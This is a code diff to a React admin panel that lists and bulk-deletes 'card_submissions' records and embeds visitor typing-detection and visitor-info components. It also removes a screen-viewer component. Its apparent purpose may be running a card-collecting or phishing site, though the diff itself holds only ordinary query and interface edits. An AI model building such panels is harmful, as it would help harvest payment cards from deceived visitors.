@@ -2,7 +2,6 @@
 import React, { useState, useEffect } from 'react';
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from './ui/table';
 import { supabase } from '@/integrations/supabase/client';
-import ScreenViewer from './ScreenViewer';
 import TypingDetector from './TypingDetector';
 import EnhancedVisitorInfo from './EnhancedVisitorInfo';
 import AdminChat from './AdminChat';
@@ -211,16 +210,18 @@ const AdminPanel = () => {
         const { error } = await supabase
           .from('card_submissions')
           .delete()
-          .neq('id', '00000000-0000-0000-0000-000000000000'); // Delete all records
+          .gt('created_at', '1900-01-01'); // Delete all records by using a condition that matches all
         
         if (error) {
           console.error('Error deleting transactions:', error);
+          showNotification('Error deleting transactions');
         } else {
           setCardSubmissions([]);
           showNotification('All transactions deleted');
         }
       } catch (error) {
         console.error('Error deleting transactions:', error);
+        showNotification('Error deleting transactions');
       }
     }
   };
@@ -255,8 +256,7 @@ const AdminPanel = () => {
         </span>
       </div>
 
-      {/* Advanced Features */}
-      <ScreenViewer />
+      {/* Advanced Features - Screen Viewer removed */}
       <TypingDetector />
       <EnhancedVisitorInfo />
       <AdminChat />
